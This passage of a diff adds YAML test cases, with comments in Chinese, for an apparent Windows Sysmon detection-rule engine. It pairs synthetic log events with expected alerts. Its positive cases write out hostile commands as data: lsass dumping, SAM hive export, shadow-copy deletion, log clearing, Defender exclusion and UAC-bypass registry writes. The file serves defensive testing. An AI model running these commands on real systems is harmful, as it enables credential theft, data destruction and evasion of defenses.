+          <TimeCreated SystemTime="2025-08-05T09:05:00.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+          <Data Name="CommandLine">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=</Data>
+          <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.script_interpreter_encoded
+        risk: high
+        count: 1
+    forbid:
+      [windows.command_shell_suspicious_parent, windows.lolbin_download, windows.suspicious_executable_in_temp]
+
+  - name: sysmon-document-spawns-command-shell
+    note: Word 启动 cmd.exe → 可疑父进程启动命令行解释器
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T09:06:00.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="CommandLine">"C:\Windows\System32\cmd.exe" /c copy \\10.0.0.9\share\invoice.doc %TEMP%\invoice.doc</Data>
+          <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.command_shell_suspicious_parent
+        risk: medium
+        count: 1
+    forbid:
+      [windows.script_interpreter_encoded, windows.lolbin_download, windows.suspicious_executable_in_temp]
+
+  - name: sysmon-normal-interpreter-usage-negative
+    note: 明文 `-File` 的运维脚本、explorer 启动的 cmd → 解释器类规则不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T10:05:00.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+          <Data Name="CommandLine">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -ExecutionPolicy Bypass -File C:\ProgramData\Vendor\deploy.ps1</Data>
+          <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+          <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+        </EventData>
+      </Event>
+
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T10:06:00.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="CommandLine">C:\Windows\system32\cmd.exe</Data>
+          <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: []
+
+  - name: sysmon-scheduled-task-persistence
+    note: schtasks /Create 创建开机触发计划任务 → 计划任务持久化候选
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T10:20:00.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\schtasks.exe</Data>
+          <Data Name="CommandLine">schtasks.exe /Create /SC ONLOGON /TN UpdateCache /TR C:\Users\Public\update.exe /F</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.scheduled_task_persistence
+        risk: medium
+        count: 1
+    forbid: [windows.discovery_command, windows.command_shell_suspicious_parent]
+
+  - name: sysmon-scheduled-task-query-negative
+    note: schtasks /Query 仅查询任务，不应标记为持久化创建
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T10:25:00.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\schtasks.exe</Data>
+          <Data Name="CommandLine">schtasks.exe /Query /FO LIST</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.scheduled_task_persistence]
+
+  # ==========================================================================
+  # 影响（Impact）
+  # ==========================================================================
+
+  - name: sysmon-inhibit-recovery-vssadmin
+    note: 删除全部卷影副本 → 破坏系统恢复能力
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:00:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\vssadmin.exe</Data>
+          <Data Name="CommandLine">vssadmin.exe delete shadows /all /quiet</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.inhibit_recovery
+        risk: high
+        count: 1
+    forbid: [windows.data_destruction, windows.security_service_stop]
+
+  - name: sysmon-vssadmin-list-negative
+    note: 正常列出卷影副本（只读查询）→ 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:00:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\vssadmin.exe</Data>
+          <Data Name="CommandLine">vssadmin.exe list shadows</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.inhibit_recovery]
+
+  - name: sysmon-ransomware-extension
+    note: 文件被追加勒索家族特征扩展名 → 疑似勒索加密
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>11</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:01:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Users\a.smith\Desktop\svhost.exe</Data>
+          <Data Name="TargetFilename">C:\Users\a.smith\Documents\Q3-report.xlsx.lockbit</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.ransomware_extension
+        risk: high
+        count: 1
+    forbid: [windows.executable_drop_in_temp]
+
+  - name: sysmon-temp-file-negative
+    note: 正常临时文件创建（通用后缀，非勒索特征）→ 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>11</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:01:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Program Files\Vendor\updater.exe</Data>
+          <Data Name="TargetFilename">C:\Users\a.smith\AppData\Local\Temp\patch.tmp</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.ransomware_extension, windows.executable_drop_in_temp]
+
+  - name: sysmon-security-service-stop
+    note: net stop windefend → 停止安全防护服务
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:02:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\net.exe</Data>
+          <Data Name="CommandLine">net stop windefend</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.security_service_stop
+        risk: medium
+        count: 1
+    forbid: [windows.create_local_account, windows.account_manipulation]
+
+  - name: sysmon-normal-service-stop-negative
+    note: 停止打印后台服务（正常运维）→ 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:02:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\net.exe</Data>
+          <Data Name="CommandLine">net stop spooler</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.security_service_stop]
+
+  - name: sysmon-data-destruction-cipher-w
+    note: cipher /w 擦除磁盘空闲空间 → 数据销毁
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:03:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\cipher.exe</Data>
+          <Data Name="CommandLine">cipher.exe /w:C:\Users\a.smith\AppData\Local\Temp</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.data_destruction
+        risk: medium
+        count: 1
+    forbid: [windows.inhibit_recovery]
+
+  - name: sysmon-cipher-encrypt-negative
+    note: cipher /e 正常启用 EFS 加密 → 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:03:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\cipher.exe</Data>
+          <Data Name="CommandLine">cipher.exe /e C:\Users\a.smith\Documents</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.data_destruction]
+
+  # ==========================================================================
+  # 凭证访问（Credential Access）
+  # ==========================================================================
+
+  - name: sysmon-lsass-memory-dump
+    note: procdump 转储 lsass 进程内存 → 疑似窃取登录凭据
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:10:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Tools\procdump64.exe</Data>
+          <Data Name="CommandLine">procdump64.exe -accepteula -ma lsass.exe C:\Users\a.smith\Documents\lsass.dmp</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.lsass_memory_dump
+        risk: critical
+        count: 1
+    forbid: [windows.sam_registry_dump, windows.credential_hunting]
+
+  - name: sysmon-lsass-query-not-dump-negative
+    note: tasklist 过滤 lsass 进程（观察 ≠ 转储）→ 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:10:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\tasklist.exe</Data>
+          <Data Name="CommandLine">tasklist.exe /fi "imagename eq lsass.exe"</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.lsass_memory_dump]
+
+  - name: sysmon-sam-hive-export
+    note: reg save hklm\sam 导出本地账户哈希库 → 疑似离线提取凭据
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:11:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\reg.exe</Data>
+          <Data Name="CommandLine">reg save hklm\sam C:\Users\a.smith\Documents\sam.hiv</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.sam_registry_dump
+        risk: critical
+        count: 1
+    forbid: [windows.lsass_memory_dump]
+
+  - name: sysmon-reg-save-software-negative
+    note: reg save 备份 SOFTWARE 配置单元（正常运维备份）→ 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:11:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\reg.exe</Data>
+          <Data Name="CommandLine">reg save hklm\software C:\Backup\software.hiv</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.sam_registry_dump]
+
+  - name: sysmon-credential-hunting-findstr
+    note: findstr /si password 递归搜索口令 → 疑似批量寻找明文凭据
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:12:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\findstr.exe</Data>
+          <Data Name="CommandLine">findstr.exe /si password C:\Users\a.smith\*.txt C:\Users\a.smith\*.xml</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.credential_hunting
+        risk: medium
+        count: 1
+    forbid: [windows.lsass_memory_dump]
+
+  - name: sysmon-findstr-error-search-negative
+    note: findstr /si 搜索错误关键字（非口令）→ 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:12:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\findstr.exe</Data>
+          <Data Name="CommandLine">findstr.exe /si error C:\Logs\app.log</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.credential_hunting]
+
+  # ==========================================================================
+  # 防御规避（Defense Evasion）
+  # ==========================================================================
+
+  - name: sysmon-eventlog-cleared
+    note: wevtutil cl Security 清空安全日志 → 疑似抹除痕迹
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:20:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\wevtutil.exe</Data>
+          <Data Name="CommandLine">wevtutil.exe cl Security</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.eventlog_cleared
+        risk: high
+        count: 1
+    forbid: [windows.certutil_decode, windows.defender_exclusion_added]
+
+  - name: sysmon-wevtutil-query-negative
+    note: wevtutil qe 查询日志（只读）→ 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:20:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\wevtutil.exe</Data>
+          <Data Name="CommandLine">wevtutil.exe qe Security /c:5 /f:text</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.eventlog_cleared]
+
+  - name: sysmon-defender-exclusion-added
+    note: Add-MpPreference 添加排除路径 → 疑似规避查杀
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:21:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+          <Data Name="CommandLine">powershell.exe -Command Add-MpPreference -ExclusionPath C:\Users\a.smith\Desktop</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.defender_exclusion_added
+        risk: high
+        count: 1
+    forbid: [windows.script_interpreter_encoded, windows.certutil_decode]
+
+  - name: sysmon-defender-get-preference-negative
+    note: Get-MpPreference 查询防护配置（只读）→ 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:21:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+          <Data Name="CommandLine">powershell.exe -Command Get-MpPreference | Select-Object ExclusionPath</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.defender_exclusion_added]
+
+  - name: sysmon-certutil-decode
+    note: certutil -decode 解码落地载荷 → 系统自带工具滥用
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:22:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
+          <Data Name="CommandLine">certutil.exe -decode C:\Users\a.smith\Downloads\payload.b64 C:\Users\a.smith\Documents\payload.exe</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.certutil_decode
+        risk: medium
+        count: 1
+    forbid: [windows.lolbin_download, windows.eventlog_cleared]
+
+  - name: sysmon-certutil-hashfile-negative
+    note: certutil -hashfile 校验文件哈希（正常运维）→ 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:22:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
+          <Data Name="CommandLine">certutil.exe -hashfile C:\Users\a.smith\Downloads\patch.exe SHA256</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.certutil_decode]
+
+  - name: sysmon-uac-bypass-registry-hijack
+    note: 写入 ms-settings\Shell\Open\command 劫持键 → 疑似 UAC 绕过
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>13</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:23:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Users\a.smith\Desktop\svhost.exe</Data>
+          <Data Name="TargetObject">HKCU\Software\Classes\ms-settings\Shell\Open\command</Data>
+          <Data Name="Details">C:\Users\a.smith\Desktop\svhost.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.uac_bypass
+        risk: medium
+        count: 1
+    forbid: [windows.registry_run_key, windows.registry_bulk_write]
+
+  - name: sysmon-normal-registry-write-negative
+    note: 正常写入用户 Shell Folders 注册表值 → 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>13</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:23:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\explorer.exe</Data>
+          <Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</Data>
+          <Data Name="Details">C:\Users\a.smith\Documents</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.uac_bypass, windows.registry_run_key]
+
+  - name: sysmon-hidden-file-attrib
+    note: attrib +h +s 同时设置隐藏与系统属性 → 疑似隐藏载荷
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:24:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\attrib.exe</Data>
+          <Data Name="CommandLine">attrib.exe +h +s C:\Users\a.smith\Desktop\svhost.exe</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.hidden_file_attrib
+        risk: low
+        count: 1
+    forbid: [windows.masquerade_extension]
+
+  - name: sysmon-attrib-hidden-only-negative
+    note: attrib +h 仅设置隐藏属性（正常整理文件）→ 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:24:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\attrib.exe</Data>
+          <Data Name="CommandLine">attrib.exe +h C:\Users\a.smith\Desktop\notes.txt</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.hidden_file_attrib]
+
+  # ==========================================================================
+  # 账户操作与自启动（Persistence）
+  # ==========================================================================
+
+  - name: sysmon-create-local-account
+    note: net user /add 创建本地账户 → 疑似建立备用访问通道
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:30:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\net.exe</Data>
+          <Data Name="CommandLine">net user support P@ssw0rd123 /add</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.create_local_account
+        risk: high
+        count: 1
+    forbid: [windows.account_manipulation, windows.account_discovery]
+
+  - name: sysmon-net-user-query-negative
+    note: net user 查询账户信息（只读）→ 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:30:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\net.exe</Data>
+          <Data Name="CommandLine">net user support</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.create_local_account, windows.account_manipulation]
+
+  - name: sysmon-account-added-to-admins
